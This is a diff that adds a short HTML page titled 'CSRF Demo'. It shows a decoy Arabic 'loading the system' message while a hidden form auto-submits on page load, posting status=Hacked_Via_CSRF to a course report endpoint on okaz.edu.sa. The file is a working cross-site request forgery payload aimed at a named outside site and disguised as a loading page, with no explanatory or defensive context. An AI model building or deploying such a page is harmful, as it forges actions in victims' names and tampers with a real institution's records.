@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Demo</title>
+</head>
+<body>
+    <h2>جارٍ تحميل النظام...</h2>
+    <form id="pwn" action="https://okaz.edu.sa/course/2033/report" method="POST">
+        <input type="hidden" name="status" value="Hacked_Via_CSRF" />
+    </form>
+    <script>
+        document.getElementById('pwn').submit();
+    </script>
+</body>
+</html>
